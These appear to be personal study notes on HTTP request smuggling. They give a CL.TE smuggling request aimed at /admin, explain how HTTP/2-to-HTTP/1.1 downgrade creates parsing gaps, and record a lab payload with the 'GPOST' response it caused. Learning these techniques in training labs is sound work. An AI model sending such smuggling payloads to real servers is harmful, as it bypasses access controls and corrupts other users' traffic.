POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1

Explanation (short):

Front-end uses Content-Length → forwards whole body as one request

Back-end uses Transfer-Encoding → ends at 0, treats GET /admin as next request

Result: hidden request is smuggled past the front-end


-----------------------------------------------------------------

#Example Explained
Browser → HTTP/2 → CDN → HTTP/1.1 → Backend
Step 1: Browser → CDN

TLS handshake

ALPN selects HTTP/2

Communication = HTTP/2

Step 2: CDN → Backend

New TCP connection

New TLS handshake (or maybe internal plain TCP)

Backend may not support HTTP/2

ALPN selects HTTP/1.1

Now:

Front side = HTTP/2

Back side = HTTP/1.1

Both protocols exist in one request path.

That’s normal.

Final Result Explained

“Both protocols in the same request path”

Meaning:
The same user request travels through different protocol versions at different points.

This is called:
Protocol translation or downgrade.

This translation layer:

Parses request

Reconstructs request

Re-sends request

And that parsing difference is exactly where request smuggling can happen.




Expanded:

Hop 1:
  TLS handshake
    └── ALPN → HTTP/2

Hop 2:
  TLS handshake
    └── ALPN → HTTP/1.1

Same user request.
-------------------------------------------------------------------------------------------------------------------------------------


LAB 1: 
Content length
TL

HOP(TLS(ALPN)) - applicattionn layer protocol negosiation

POST / HTTP/1.1
Host: 0a2a00b70458fdc780b4c15800fa00d3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G

for next person response  : 
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 27

"Unrecognized method GPOST" 

